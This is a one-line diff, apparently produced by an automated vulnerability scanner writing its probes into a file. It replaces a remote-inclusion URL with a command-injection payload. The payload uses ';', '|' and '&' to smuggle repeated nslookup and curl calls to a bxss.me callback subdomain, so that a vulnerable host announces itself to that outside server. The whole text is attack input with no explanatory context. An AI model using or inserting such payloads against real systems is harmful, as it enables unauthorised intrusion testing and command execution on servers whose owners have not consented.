@@ -1,1 +1,1 @@
-Http://bxss.me/t/fit.txt
+;(nslookup -q=cname hitveeozelaca5a484.bxss.me||curl hitveeozelaca5a484.bxss.me)|(nslookup -q=cname hitveeozelaca5a484.bxss.me||curl hitveeozelaca5a484.bxss.me)&(nslookup -q=cname hitveeozelaca5a484.bxss.me||curl hitveeozelaca5a484.bxss.me)
